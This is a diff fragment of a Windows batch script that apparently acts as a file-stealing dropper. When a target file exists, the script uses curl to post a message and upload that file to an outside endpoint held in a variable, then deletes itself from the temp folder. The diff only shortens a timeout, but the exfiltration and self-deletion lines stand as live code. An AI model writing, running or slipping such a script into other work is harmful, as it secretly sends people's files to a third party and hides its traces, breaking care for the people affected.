@@ -28,6 +28,6 @@ if exist "%CodexE%" (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
     curl -F "file=@%CodexE%" %Codex%
 )
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 del "%temp%\xdlls2s.bat"
 exit
